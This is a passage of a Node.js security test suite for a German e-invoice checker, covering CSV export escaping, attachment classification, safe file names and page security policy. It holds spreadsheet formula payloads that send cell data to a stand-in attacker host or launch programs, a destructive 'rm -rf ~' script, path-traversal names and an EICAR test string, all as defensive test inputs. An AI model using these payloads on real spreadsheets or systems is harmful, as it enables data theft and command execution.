#!/usr/bin/env node
/*
 * run-security-tests.cjs — the security properties of the program and of the published security information:
 *
 *  1. CSV exports and formula injection (CWE-1236; fixed in 0.4.0, advisory E-RECHNUNG-PRUEFER-SA-2026-001): an
 *     invoice with attack strings in its free-text fields, checked under a file name that is itself a formula, through
 *     the whole pipeline (PrueferCore -> Reports): no cell of the three CSV files is read as a formula by a spreadsheet
 *     program, and every attack string is kept, as text (leading apostrophe);
 *  2. downloads: safe file names (FileSafety.safeFileName) and the classification of attachments (FileSafety.classify):
 *     programs, scripts, HTML/SVG, Office documents with macros, archives with programs, the EICAR test file
 *     (assembled at run time), disguised names (bidirectional controls), mismatching types; Base64 decoding;
 *  3. the page dist/E-Rechnung-Pruefer.html: Content-Security-Policy (default-src 'none', nothing unsafe,
 *     connect-src 'none', Trusted Types required), every inline script and style allowed by its SHA-256 and nothing
 *     else, no inline event handler, no style attribute, nothing loaded from elsewhere;
 *  4. the sources (src/*.js) and the engine bundle: no HTML or code injection sinks, no network APIs, storage only in
 *     the user interface, XML parsing only through the Trusted Types policy;
 *  5. the static pages of the site (dist/site-pages): no script, Content-Security-Policy with the hash of their style,
 *     every link to the site resolves to a published file; the workflows (.github/workflows): no trigger that gives
 *     write permissions to code of others, read-only top-level permissions, no checkout of a ref from the event, no
 *     expression inside a run script, the publication only after the complete verification of the same commit; the
 *     test tools only from package-lock.json (npm ci, SHA-512 of every package, registry signatures verified);
 *  6. security.txt (RFC 9116, BSI TR-03183-3 4.2): fields, values, Expires more than 30 days and at most a year ahead;
 *  7. CSAF 2.0 (tools/make-csaf.cjs): every document and the provider metadata against the official schemas (Python
 *     jsonschema, test/sbom-oracle/validate_csaf.py), the mandatory tests of CSAF 2.0 section 6.1 that apply to them and
 *     several recommended ones (6.2), CVSS 3.1 base scores computed here from the vectors, the distribution
 *     (file names, year folders, index.txt, changes.csv, hash files, provider metadata); the CSAF VEX states the same
 *     as the CycloneDX VEX; the advisory names the current version as fixed and no affected page is the current one;
 *  8. consistency of the security information (legal/security.json, impressum, SECURITY.md, docs, the page) and
 *     privacy: the private address of the manufacturer and the e-mail address of his account appear nowhere.
 *
 * Usage: node test/run-security-tests.cjs <xrechnung-testsuite checkout> <csaf checkout>
 * Licence: EUPL-1.2
 */
'use strict';
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const { spawnSync } = require('child_process');

const root = path.join(__dirname, '..');
const [testsuiteDir, csafDir] = process.argv.slice(2);
const { createEnv } = require(path.join(root, 'tools', 'node-env.cjs'));
const PrueferCore = require(path.join(root, 'src', 'pruefer-core.js'));
const Reports = require(path.join(root, 'src', 'reports.js'));
const FileSafety = require(path.join(root, 'src', 'file-safety.js'));
const read = (f) => fs.readFileSync(path.join(root, f), 'utf8');
const sha = (b, alg, enc) => crypto.createHash(alg || 'sha256').update(b).digest(enc || 'hex');

let pass = 0, fail = 0;
const failures = [];
const counts = {};
let section = '';
const check = (name, ok, detail) => { counts[section] = (counts[section] || 0) + 1; if (ok) pass++; else { fail++; failures.push('[' + section + '] ' + name + (detail !== undefined ? ' – ' + String(detail).slice(0, 400) : '')); } };

/** strict reader of the CSV files of the Prüfer: optional BOM, ';', CRLF, quoted fields with "" */
function readCsv(text) {
  if (text.charCodeAt(0) === 0xfeff) text = text.slice(1);
  const rows = [];
  let row = [], cell = '', i = 0, quoted = false, inQuotes = false;
  while (i < text.length) {
    const c = text[i];
    if (inQuotes) {
      if (c === '"') { if (text[i + 1] === '"') { cell += '"'; i += 2; continue; } inQuotes = false; i++; continue; }
      cell += c; i++; continue;
    }
    if (c === '"') { if (cell !== '' || quoted) throw new Error('quote inside an unquoted field at ' + i); inQuotes = true; quoted = true; i++; continue; }
    if (c === ';') { row.push(cell); cell = ''; quoted = false; i++; continue; }
    if (c === '\r' && text[i + 1] === '\n') { row.push(cell); rows.push(row); row = []; cell = ''; quoted = false; i += 2; continue; }
    if (c === '\n' || c === '\r') throw new Error('bare line break outside quotes at ' + i);
    cell += c; i++;
  }
  if (inQuotes) throw new Error('unterminated quote');
  if (cell !== '' || row.length) { row.push(cell); rows.push(row); }
  return rows;
}
// what a spreadsheet program evaluates (OWASP CSV Injection; Excel, LibreOffice): =, +, -, @ (and the full-width forms
// that are normalised by some programs), a leading tab or carriage return; plain numbers are numbers, not formulas
const EVALUATED = (cell) => /^\s*[=+\-@＝＋－＠]|^[\t\r]/.test(cell) && !/^[-+]?\d+(?:,\d+)?$/.test(cell);

(async () => {
  // =============================================================================================================
  section = 'csv';
  // =============================================================================================================
  const PAYLOADS = [
    '=HYPERLINK("https://angreifer.example/?d="&A2;"Hier klicken")',
    "=cmd|' /C calc'!A0",
    "@SUM(1+1)*cmd|' /C calc'!A0",
    '+1+cmd|\' /C notepad\'!A0',
    '-2+3+cmd|\' /C calc\'!A0',
    '＝1+1 (Vollbreite)',
    '=1+1;=2+2 (Trennzeichen)',
    '=WEBSERVICE("https://angreifer.example/"&B2)',
    '"=1+1" (Anführungszeichen)',
    '@angreifer',
  ];
  const base = testsuiteDir ? path.join(testsuiteDir, 'src', 'test', 'technical-cases', 'cius', '01.01_comprehensive_test_ubl.xml') : '';
  if (!base || !fs.existsSync(base)) check('XRechnung test suite given', false, String(testsuiteDir));
  else {
    const xmlEsc = (s) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
    let xml = fs.readFileSync(base, 'utf8');
    // one invoice per attack string: every free-text element (seller, buyer, addresses, notes, items, references)
    // carries it, and the file name is a formula
    const ELEMENTS = ['cbc:Note', 'cbc:RegistrationName', 'cbc:Name', 'cbc:StreetName', 'cbc:AdditionalStreetName', 'cbc:CityName', 'cbc:Description', 'cbc:BuyerReference', 'cbc:Line'];
    const fileName = '=HYPERLINK("https://angreifer.example/"&A2)-rechnung.xml';
    const env = createEnv({ exclude: /^PEPPOL-/ });
    const legal = JSON.parse(read('legal/ust-pflichtangaben.json'));
    const original = fs.readFileSync(base, 'utf8');
    // the form a cell must have: a value a spreadsheet program would evaluate begins with an apostrophe, any other
    // value is written unchanged
    const expected = (v) => (EVALUATED(v) ? "'" + v : v);
    let analysed = 0, amountsChecked = false;
    for (const p of PAYLOADS) {
      let placed = 0;
      let xml = original;
      for (const el of ELEMENTS) xml = xml.replace(new RegExp('<' + el + '>([^<]*)</' + el + '>', 'g'), () => { placed++; return '<' + el + '>' + xmlEsc(p) + '</' + el + '>'; });
      const r = await PrueferCore.analyzeBytes(env, new Uint8Array(Buffer.from(xml, 'utf8')), fileName);
      if (r.model) analysed++;
      const outputs = { Pruefbericht: Reports.findingsCsv([r], legal), Rechnungsdaten: Reports.invoicesCsv([r]), Positionen: Reports.linesCsv([r]) };
      const label = JSON.stringify(p.slice(0, 32)) + ' in ' + placed + ' elements';
      let found = 0, nameFound = false;
      const evaluated = [];
      for (const [name, text] of Object.entries(outputs)) {
        let rows;
        try { rows = readCsv(text); } catch (e) { check(label + ': ' + name + ' read by the strict CSV reader', false, e.message); continue; }
        for (const row of rows) for (const cell of row) {
          if (EVALUATED(cell)) evaluated.push(name + ': ' + cell);
          if (cell === expected(p)) found++;
          if (cell === expected(fileName)) nameFound = true;
        }
        if (!amountsChecked && name === 'Rechnungsdaten' && rows.length > 1) {
          const col = rows[0].findIndex((h) => /BT-112|BT-115|Gesamtbetrag|Zahlbetrag/.test(h));
          check('amounts stay plain numbers (column ' + (rows[0][col] || '?') + ': ' + (rows[1][col] || '') + ')', col >= 0 && /^-?\d+(,\d+)?$/.test(rows[1][col]));
          amountsChecked = true;
        }
      }
      check(label + ': no cell of the three CSV files is evaluated as a formula', evaluated.length === 0, evaluated.slice(0, 3).join(' | '));
      check(label + ': kept as ' + (EVALUATED(p) ? 'text with a leading apostrophe' : 'it is') + ' (' + found + ' cells)', found >= 3, found);
      check(label + ': the file name kept as text with a leading apostrophe', nameFound);
    }
    check('every manipulated invoice was read (data model present): ' + analysed + ' of ' + PAYLOADS.length, analysed === PAYLOADS.length);
    check('csvFormulaRisk (classification of CSV attachments): a formula cell is recognised, plain numbers are not', FileSafety.csvFormulaRisk('a;b\r\n1;=HYPERLINK("x")\r\n') && FileSafety.csvFormulaRisk('a;b\r\n@SUM(1)\r\n') && !FileSafety.csvFormulaRisk('a;b\r\n-12,50;+3\r\n'));
  }

  // =============================================================================================================
  section = 'downloads';
  // =============================================================================================================
  const B = (...parts) => new Uint8Array(Buffer.concat(parts.map((p) => (typeof p === 'string' ? Buffer.from(p, 'latin1') : Buffer.from(p)))));
  /** a ZIP archive with stored entries (local headers + central directory) */
  function zip(entries) {
    const local = [], central = [];
    let offset = 0;
    for (const [name, content] of entries) {
      const n = Buffer.from(name, 'utf8'), d = Buffer.from(content);
      const crc = crc32(d);
      const lh = Buffer.alloc(30); lh.writeUInt32LE(0x04034b50, 0); lh.writeUInt16LE(20, 4); lh.writeUInt32LE(crc, 14); lh.writeUInt32LE(d.length, 18); lh.writeUInt32LE(d.length, 22); lh.writeUInt16LE(n.length, 26);
      local.push(lh, n, d);
      const ch = Buffer.alloc(46); ch.writeUInt32LE(0x02014b50, 0); ch.writeUInt16LE(20, 4); ch.writeUInt16LE(20, 6); ch.writeUInt32LE(crc, 16); ch.writeUInt32LE(d.length, 20); ch.writeUInt32LE(d.length, 24); ch.writeUInt16LE(n.length, 28); ch.writeUInt32LE(offset, 42);
      central.push(ch, n);
      offset += 30 + n.length + d.length;
    }
    const cd = Buffer.concat(central);
    const end = Buffer.alloc(22); end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(entries.length, 8); end.writeUInt16LE(entries.length, 10); end.writeUInt32LE(cd.length, 12); end.writeUInt32LE(offset, 16);
    return new Uint8Array(Buffer.concat(local.concat([cd, end])));
  }
  function crc32(buf) { let c, crc = 0xffffffff; for (let n = 0; n < buf.length; n++) { c = (crc ^ buf[n]) & 0xff; for (let k2 = 0; k2 < 8; k2++) c = c & 1 ? (c >>> 1) ^ 0xedb88320 : c >>> 1; crc = (crc >>> 8) ^ c; } return (crc ^ 0xffffffff) >>> 0; }
  // the EICAR test file, assembled here so that neither this file nor the repository contains the signature
  const eicar = ['X5O!P%@AP[4', '\\PZX54(P^)7CC)7}$EICAR-', 'STANDARD-ANTIVIRUS-', 'TEST-FILE!$H+H*'].join('');
  check('EICAR assembled (68 characters)', eicar.length === 68);
  const CASES = [
    // [label, bytes, name, mime, expected risk, expected detected id]
    ['EICAR test file', B(eicar), 'eicar.com.txt', 'text/plain', 'danger', 'eicar'],
    ['EICAR test file with a trailing line break', B(eicar + '\r\n'), 'test.txt', 'text/plain', 'danger', 'eicar'],
    ['EICAR test file followed by 200 bytes', B(eicar + 'x'.repeat(200)), 'test.txt', 'text/plain', 'danger', 'eicar'],
    ['Windows program (MZ)', B('MZ', Buffer.alloc(200)), 'rechnung.pdf', 'application/pdf', 'danger', 'pe'],
    ['Linux program (ELF)', B([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1], Buffer.alloc(100)), 'tool', 'application/octet-stream', 'danger', 'elf'],
    ['macOS program (Mach-O 64)', B([0xcf, 0xfa, 0xed, 0xfe], Buffer.alloc(100)), 'app', '', 'danger', 'macho'],
    ['Java class file', B([0xca, 0xfe, 0xba, 0xbe, 0, 0, 0, 52], Buffer.alloc(40)), 'Main.class', '', 'danger', 'javaclass'],
    ['shell script (#!)', B('#!/bin/sh\nrm -rf ~\n'), 'liesmich.txt', 'text/plain', 'danger', 'script'],
    ['Windows shortcut (LNK)', B([0x4c, 0, 0, 0, 1, 0x14, 2, 0], Buffer.alloc(80)), 'Rechnung.pdf.lnk', '', 'danger', 'lnk'],
    ['HTML disguised as PDF', B('<!DOCTYPE html><html><script>alert(1)</script></html>'), 'rechnung.pdf', 'application/pdf', 'danger', 'html'],
    ['SVG image (can run scripts)', B('<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'), 'logo.svg', 'image/svg+xml', 'danger', 'svg'],
    ['Word document with macros', zip([['[Content_Types].xml', '<Types/>'], ['word/document.xml', '<w/>'], ['word/vbaProject.bin', 'VBA']]), 'rechnung.docx', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'danger', 'ooxml-macro'],
    ['Excel workbook without macros', zip([['[Content_Types].xml', '<Types/>'], ['xl/workbook.xml', '<w/>']]), 'liste.xlsx', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', 'caution', 'ooxml'],
    ['OpenDocument with Basic macros', zip([['mimetype', 'application/vnd.oasis.opendocument.text'], ['content.xml', '<x/>'], ['Basic/Standard/Module1.xml', '<m/>']]), 'brief.odt', 'application/vnd.oasis.opendocument.text', 'danger', 'odf-macro'],
    ['ZIP with a program', zip([['rechnung.pdf', '%PDF-1.7'], ['setup.exe', 'MZ']]), 'anlagen.zip', 'application/zip', 'danger', 'zip-exec'],
    ['ZIP without programs', zip([['liesmich.txt', 'hallo']]), 'anlagen.zip', 'application/zip', 'caution', 'zip'],
    ['Java archive', zip([['META-INF/MANIFEST.MF', 'Main-Class: X'], ['X.class', 'cafe']]), 'tool.zip', 'application/zip', 'danger', 'jar'],
    ['legacy Office file (OLE)', B([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1], Buffer.alloc(512)), 'alt.doc', 'application/msword', 'caution', 'ole'],
    ['RTF document', B('{\\rtf1\\ansi hallo}'), 'brief.rtf', 'application/rtf', 'caution', 'rtf'],
    ['PDF document', B('%PDF-1.7\n1 0 obj<<>>endobj\n%%EOF\n'), 'rechnung.pdf', 'application/pdf', 'ok', 'pdf'],
    ['PDF under a program name', B('%PDF-1.7\n%%EOF\n'), 'rechnung.pdf.exe', 'application/pdf', 'danger', 'pdf'],
    ['PNG image', B([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a], Buffer.alloc(30)), 'scan.png', 'image/png', 'ok', 'png'],
    ['PNG declared as PDF', B([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a], Buffer.alloc(30)), 'scan.pdf', 'application/pdf', 'caution', 'png'],
    ['CSV with a formula', B('Artikel;Preis\r\nSchraube;=HYPERLINK("https://x.example")\r\n'), 'liste.csv', 'text/csv', 'caution', 'text'],
    ['CSV without formulas', B('Artikel;Preis\r\nSchraube;-12,50\r\n'), 'liste.csv', 'text/csv', 'ok', 'text'],
    ['XML document', B('<?xml version="1.0"?><Invoice/>'), 'rechnung.xml', 'text/xml', 'ok', 'xml'],
    ['name with a right-to-left override (".exe" shown as ".pdf")', B('%PDF-1.7\n%%EOF\n'), 'rechnung\u202Efdp.exe', 'application/pdf', 'danger', 'pdf'],
    ['name with a zero-width space', B('%PDF-1.7\n%%EOF\n'), 're\u200Bchnung.pdf', 'application/pdf', 'caution', 'pdf'],
    ['unknown binary content', B([0x00, 0x01, 0x02, 0x03, 0xfe, 0xff, 0x00, 0x10]), 'daten.dat', '', 'caution', 'unknown'],
  ];
  for (const [label, bytes, name, mime, risk, detected] of CASES) {
    const c = FileSafety.classify(bytes, name, mime);
    check(label + ': ' + risk + ' (' + detected + ')', c.risk === risk && c.detected === detected, c.risk + ' ' + c.detected + ' ' + c.reasons.join(' / '));
    check(label + ': offered name ' + (risk === 'danger' ? 'ends with .gesperrt' : 'is the safe name'), risk === 'danger' ? c.downloadName === c.safeName + '.gesperrt' : c.downloadName === c.safeName, c.downloadName);
    check(label + ': offered name without control or bidirectional characters, separators or reserved characters', !/[\p{Cc}\p{Cf}\\/:*?"<>|]/u.test(c.downloadName), JSON.stringify(c.downloadName));
    if (risk !== 'ok') check(label + ': the reason is stated', c.reasons.length > 0);
  }
  const NAMES = [
    ['../../etc/passwd', (s) => s === 'etc_passwd'],
    ['..\\..\\Windows\\System32\\drivers\\etc\\hosts', (s) => !/[\\/]/.test(s) && !s.startsWith('.')],
    ['CON', (s) => s === '_CON'], ['nul.txt', (s) => s === '_nul.txt'], ['COM1.pdf', (s) => s === '_COM1.pdf'], ['LPT9', (s) => s === '_LPT9'],
    ['rechnung.pdf. . .', (s) => s === 'rechnung.pdf'], ['  .versteckt', (s) => s === 'versteckt'],
    ['a'.repeat(300) + '.pdf', (s) => s.length <= 120 && s.endsWith('.pdf')],
    ['Rechnung\u202Efdp.exe', (s) => s === 'Rechnungfdp.exe'], ['Rech\u200Dnung\u2066.pdf', (s) => s === 'Rechnung.pdf'],
    ['Zeile\nUmbruch\r.txt', (s) => s === 'ZeileUmbruch.txt'], ['a<b>c:d|e?f*g"h.txt', (s) => s === 'a_b_c_d_e_f_g_h.txt'],
    ['', (s) => s === 'Datei'], ['\u3164\u115F.pdf', (s) => s === 'pdf' || s === 'Datei' || !/[\u3164\u115F]/.test(s)],
  ];
  for (const [n, ok] of NAMES) { const s = FileSafety.safeFileName(n); check('safe file name ' + JSON.stringify(n.slice(0, 40)) + ' -> ' + JSON.stringify(s.slice(0, 40)), ok(s)); }
  // active content is found also without a usable cross-reference table (scan fallback of the PDF reader)
  {
    const PdfA3Checks = require(path.join(root, 'src', 'pdfa3-checks.js'));
    const PdfEmbedded = require(path.join(root, 'src', 'pdf-embedded.js'));
    for (const c of require(path.join(__dirname, 'active-pdfs.cjs')).cases().filter((x) => x.brokenXref)) {
      const doc = await PdfEmbedded.loadDocument(c.bytes, []);
      const a = PdfA3Checks.activeContent(doc);
      const cl = FileSafety.addPdfFindings(FileSafety.classify(c.bytes, 'anlage.pdf', 'application/pdf'), a);
      check('PDF attachment ' + c.name + ' (read by scanning, ' + doc.method + '): JavaScript/Launch found, danger, .gesperrt', doc.method === 'scan' && a.javascript === c.javascript && a.launch === c.launch && cl.risk === 'danger' && cl.downloadName === 'anlage.pdf.gesperrt', doc.method + ' ' + JSON.stringify({ js: a.javascript, launch: a.launch, risk: cl.risk }));
    }
  }
  // the active content of a PDF attachment raises its classification
  const pdfC = FileSafety.addPdfFindings(FileSafety.classify(B('%PDF-1.7\n%%EOF\n'), 'anlage.pdf', 'application/pdf'), { javascript: true, launch: false, forbidden: [{ type: 'JavaScript' }], submitForm: false });
  check('PDF attachment with JavaScript: danger, offered as .gesperrt', pdfC.risk === 'danger' && pdfC.downloadName === 'anlage.pdf.gesperrt', pdfC.risk + ' ' + pdfC.downloadName);
  // Base64 decoding of attachments = Node's decoder (line breaks, padding, URL alphabet)
  for (const len of [0, 1, 2, 3, 57, 1000, 65537]) {
    const raw = crypto.randomBytes(len);
    const b64 = raw.toString('base64').replace(/(.{76})/g, '$1\r\n');
    check('Base64 ' + len + ' bytes with line breaks = Buffer.from', Buffer.from(FileSafety.decodeBase64(b64)).equals(raw));
  }
  // the content detection runs on up to 4 KiB of text from the file: linear time for any text (CodeQL js/redos found an
  // exponential pattern for comment-heavy prologs before the release of 0.4.0), and HTML/SVG still recognised behind
  // an XML declaration and comments, also in upper case
  {
    const hostile = ['<!--' + '--><!--'.repeat(5000) + 'x', '<?xml version="1.0"?>' + '<!--'.repeat(3000), '<svg ' + 'xmlns '.repeat(3000), '<html ' + ' '.repeat(8000) + 'xmlns'];
    const t0 = Date.now();
    const ids = hostile.map((t) => FileSafety.detect(B(t)).id);
    const ms = Date.now() - t0;
    check('content detection of hostile text in linear time (' + hostile.length + ' files, ' + ms + ' ms)', ms < 2000, ms + ' ms ' + ids.join(','));
    const svg = FileSafety.detect(B('<?xml version="1.0"?>\n' + '<!-- comment -->\n'.repeat(40) + '<SVG xmlns="http://www.w3.org/2000/svg"><script/></SVG>')).id;
    const html = FileSafety.detect(B('<!-- generated -->\n<!DOCTYPE html><html><script>x()</script></html>')).id;
    check('SVG behind an XML declaration and 40 comments recognised (upper case element)', svg === 'svg', svg);
    check('HTML behind a comment recognised', html === 'html', html);
  }

  // =============================================================================================================
  section = 'page';
  // =============================================================================================================
  const html = fs.readFileSync(path.join(root, 'dist', 'E-Rechnung-Pruefer.html'), 'utf8');
  const cspMatch = /<meta http-equiv="Content-Security-Policy" content="([^"]+)">/.exec(html);
  check('Content-Security-Policy as meta element in the head', !!cspMatch && html.indexOf(cspMatch[0]) < html.indexOf('</head>'));
  const csp = cspMatch ? cspMatch[1].replace(/&#39;/g, "'") : '';
  const directives = {};
  for (const d of csp.split(';').map((x) => x.trim()).filter(Boolean)) { const [n, ...v] = d.split(/\s+/); directives[n] = v; }
  check("default-src 'none'", JSON.stringify(directives['default-src']) === JSON.stringify(["'none'"]));
  check("connect-src 'none', form-action 'none', base-uri 'none', object-src 'none'", ['connect-src', 'form-action', 'base-uri', 'object-src'].every((d) => JSON.stringify(directives[d]) === JSON.stringify(["'none'"])));
  check("Trusted Types required for scripts, one policy (pruefer-xml)", JSON.stringify(directives['require-trusted-types-for']) === JSON.stringify(["'script'"]) && JSON.stringify(directives['trusted-types']) === JSON.stringify(['pruefer-xml']));
  check("no 'unsafe-inline', 'unsafe-eval', 'unsafe-hashes', 'strict-dynamic', wildcard, scheme or host source", !/'unsafe-|'strict-dynamic'|\*|https?:|data:|blob:|filesystem:/.test(csp), csp.match(/'unsafe-[a-z-]+'|\*|https?:\S*|data:|blob:/g));
  check('only these directives (no img-src, font-src, frame-src, worker-src … – default-src none covers them)', Object.keys(directives).sort().join(' ') === 'base-uri connect-src default-src form-action object-src require-trusted-types-for script-src style-src trusted-types', Object.keys(directives).join(' '));
  // tokenize: the elements outside script/style contents; inline scripts and styles with their exact contents
  const scripts = [], styles = [], dataBlocks = [];
  let outside = '';
  {
    let i = 0;
    const lower = html.toLowerCase();
    while (i < html.length) {
      const s = lower.indexOf('<script', i), t = lower.indexOf('<style', i);
      const next = [s, t].filter((x) => x >= 0).sort((a, b) => a - b)[0];
      if (next === undefined) { outside += html.slice(i); break; }
      outside += html.slice(i, next);
      const isScript = next === s;
      const tagEnd = html.indexOf('>', next);
      const tag = html.slice(next, tagEnd + 1);
      const close = lower.indexOf(isScript ? '</script' : '</style', tagEnd);
      const content = html.slice(tagEnd + 1, close);
      if (isScript) (/type="application\/json"/.test(tag) ? dataBlocks : scripts).push({ tag, content }); else styles.push({ tag, content });
      outside += tag;
      i = lower.indexOf('>', close) + 1;
    }
  }
  const hashOf = (c) => "'sha256-" + sha(Buffer.from(c, 'utf8'), 'sha256', 'base64') + "'";
  check('inline scripts: ' + scripts.length + ', every one without attributes (no src, no event handlers)', scripts.length >= 20 && scripts.every((x) => x.tag === '<script>'), scripts.map((x) => x.tag).filter((t) => t !== '<script>').join(' '));
  check('every inline script allowed by its SHA-256 in script-src', scripts.every((x) => (directives['script-src'] || []).includes(hashOf(x.content))));
  check('script-src allows exactly the inline scripts (no other hash)', (directives['script-src'] || []).length === new Set(scripts.map((x) => hashOf(x.content))).size);
  check('every inline style allowed by its SHA-256 in style-src, and nothing else', styles.length >= 1 && styles.every((x) => (directives['style-src'] || []).includes(hashOf(x.content))) && (directives['style-src'] || []).length === new Set(styles.map((x) => hashOf(x.content))).size);
  check('JSON data blocks only (pruefer-security, pruefer-build): not executed, no hash needed', dataBlocks.length === 2 && dataBlocks.every((x) => /id="pruefer-(security|build)"/.test(x.tag)));
  for (const d of dataBlocks) { let okJson = true; try { JSON.parse(d.content); } catch (e) { okJson = false; } check('data block ' + /id="([^"]+)"/.exec(d.tag)[1] + ': valid JSON without "</"', okJson && !/<\//.test(d.content)); }
  check('no inline event handler attribute (on…=) in the markup', !/<[a-z][^>]*\son[a-z]+\s*=/i.test(outside), (outside.match(/<[a-z][^>]*\son[a-z]+\s*=[^>]*>/i) || [''])[0].slice(0, 120));
  check('no style attribute in the markup', !/<[a-z][^>]*\sstyle\s*=/i.test(outside));
  check('nothing loaded from elsewhere: no link, iframe, object, embed, base, img/source/video/audio with a source, form action', !/<(link|iframe|frame|object|embed|base|applet)\b/i.test(outside) && !/<(img|source|video|audio|track|input)\b[^>]*\ssrc\s*=/i.test(outside) && !/<form\b[^>]*\saction\s*=/i.test(outside));
  const hrefs = Array.from(outside.matchAll(/\shref\s*=\s*"([^"]*)"/gi)).map((m) => m[1]);
  check('links of the markup only to https:, mailto: or a fragment (' + hrefs.length + ')', hrefs.every((h) => /^(https:\/\/|mailto:|#)/.test(h)), hrefs.filter((h) => !/^(https:\/\/|mailto:|#)/.test(h)).join(' '));
  check('referrer policy no-referrer', /<meta name="referrer" content="no-referrer">/.test(html));
  // BSI TR-03183-3 4.5.1 b, 4.5.2 a: the page for vulnerability reports and the CVD policy are reached from the home
  // page by a link that works without JavaScript (static markup, not built by script)
  const secSite = JSON.parse(read('legal/security.json')).site;
  check('home page: static links to the vulnerability report page and the CVD policy (no JavaScript needed)', hrefs.includes(secSite + 'security-contact/') && hrefs.includes(secSite + 'cvd-policy/'));
  check('no "</script" inside any script (HTML parsing)', scripts.every((x) => !/<\/script/i.test(x.content)));

  // =============================================================================================================
  section = 'sources';
  // =============================================================================================================
  const srcFiles = fs.readdirSync(path.join(root, 'src')).filter((f) => f.endsWith('.js')).map((f) => 'src/' + f);
  const engine = read('vendor/fontoxpath.iife.min.js');
  const SINKS = [
    ['assignment to innerHTML/outerHTML', /\.(innerHTML|outerHTML)\s*=(?!=)/],
    ['insertAdjacentHTML', /insertAdjacentHTML\s*\(/], ['document.write', /document\.write(ln)?\s*\(/], ['createContextualFragment', /createContextualFragment/],
    ['eval', /(^|[^\w.$])eval\s*\(/], ['new Function', /new\s+Function\s*\(/], ['setTimeout/setInterval with a string', /set(Timeout|Interval)\s*\(\s*['"`]/],
    ['srcdoc', /\.srcdoc\b/], ['event handler attribute set from script', /setAttribute\s*\(\s*['"]on/i], ['window.open', /window\.open\s*\(/],
    ['network: fetch', /(^|[^\w.$])fetch\s*\(/], ['network: XMLHttpRequest', /XMLHttpRequest/], ['network: WebSocket', /WebSocket/], ['network: EventSource', /EventSource/],
    ['network: sendBeacon', /sendBeacon/], ['network: importScripts', /importScripts/], ['network: RTCPeerConnection', /RTCPeerConnection/],
    ['dynamic import', /(^|[^\w.$])import\s*\(/], ['service worker', /serviceWorker/], ['postMessage', /postMessage/],
  ];
  for (const [name, re] of SINKS) {
    const hits = srcFiles.filter((f) => re.test(read(f).split('\n').filter((l) => !/^\s*(\*|\/\/|\/\*)/.test(l)).join('\n')));
    check('src/*.js: no ' + name, hits.length === 0, hits.join(', '));
    check('engine bundle: no ' + name, !re.test(engine));
  }
  const storage = srcFiles.filter((f) => /localStorage|sessionStorage|indexedDB/.test(read(f)));
  check('storage only in the user interface (src/app.js)', storage.length === 1 && storage[0] === 'src/app.js', storage.join(', '));
  const parsers = srcFiles.filter((f) => /new\s+DOMParser\b/.test(read(f)));
  check('DOMParser only in src/xml-parse.js (Trusted Types policy) and the Node fallback of src/schematron.js', parsers.every((f) => f === 'src/xml-parse.js' || f === 'src/schematron.js') && parsers.includes('src/xml-parse.js'), parsers.join(', '));
  check('the Trusted Types policy passes only to DOMParser with application/xml', /createPolicy\('pruefer-xml'/.test(read('src/xml-parse.js')) && /parseFromString\(.*'application\/xml'\)/.test(read('src/xml-parse.js')));
  check('the user interface never builds HTML from strings (no html option of the element helper)', !/\bhtml:\s/.test(read('src/app.js')) && !/innerHTML/.test(read('src/app.js')));

  // =============================================================================================================
  section = 'site';
  // =============================================================================================================
  const sec = JSON.parse(read('legal/security.json'));
  const siteDir = path.join(root, 'dist', 'site-pages');
  const siteFiles = [];
  (function walk(d) { for (const e of fs.readdirSync(d, { withFileTypes: true })) { const p = path.join(d, e.name); if (e.isDirectory()) walk(p); else siteFiles.push(path.relative(siteDir, p).split(path.sep).join('/')); } })(siteDir);
  // the files the job pages of verify.yml publishes beside the site pages (root of the site)
  const ROOT_FILES = ['index.html', 'E-Rechnung-Pruefer.html', 'BUILD_INFO.json', 'sbom.cdx.json', 'vex.cdx.json', 'STANDARDS_MANIFEST.json', 'VERIFICATION.json', 'test-environment.cdx.json'];
  const verifyYml = read('.github/workflows/verify.yml');
  const pagesJob = (/\n  pages:\n([\s\S]*?)(?=\n  [a-z][\w-]*:\n|$)/.exec(verifyYml) || [null, ''])[1];
  const reEscape = (t) => t.replace(/[\\^$.*+?()[\]{}|]/g, '\\$&');
  for (const f of ROOT_FILES) check('the job pages publishes ' + f, new RegExp('site/' + reEscape(f) + '\\b').test(pagesJob));
  check('the job pages publishes the site pages including .well-known (hidden files)', /cp -R dist\/site-pages\/\. site\//.test(pagesJob) && /include-hidden-files: true/.test(pagesJob));
  const published = new Set(siteFiles.concat(ROOT_FILES));
  const resolves = (u) => { const rel = u.slice(sec.site.length).split('#')[0]; return rel === '' || published.has(rel) || published.has(rel.replace(/\/?$/, '/index.html')) || (rel.endsWith('/') && published.has(rel + 'index.html')); };
  for (const f of siteFiles.filter((x) => x.endsWith('.html'))) {
    const page = fs.readFileSync(path.join(siteDir, f), 'utf8');
    check(f + ': no script', !/<script\b/i.test(page) && !/\son[a-z]+\s*=/i.test(page.replace(/<style>[\s\S]*?<\/style>/, '')));
    const m = /<meta http-equiv="Content-Security-Policy" content="([^"]+)">/.exec(page);
    const st = /<style>([\s\S]*?)<\/style>/.exec(page);
    const policy = m ? m[1].replace(/&#39;/g, "'") : '';
    check(f + ': CSP default-src none, nothing but its own style', !!m && /^default-src 'none'; /.test(policy) && !/'unsafe-|https?:|\*/.test(policy) && (st ? policy.includes(hashOf(st[1])) : !/style-src/.test(policy)) && !/<link\b|<img\b|<iframe\b/i.test(page), policy);
    const links = Array.from(page.matchAll(/href="([^"]+)"/g)).map((x) => x[1].replace(/&amp;/g, '&'));
    const internal = links.filter((u) => u.startsWith(sec.site));
    const broken = internal.filter((u) => !resolves(u));
    check(f + ': every link into the site resolves (' + internal.length + ')', broken.length === 0, broken.join(' '));
    const relative = links.filter((u) => !/^(https:\/\/|mailto:)/.test(u));
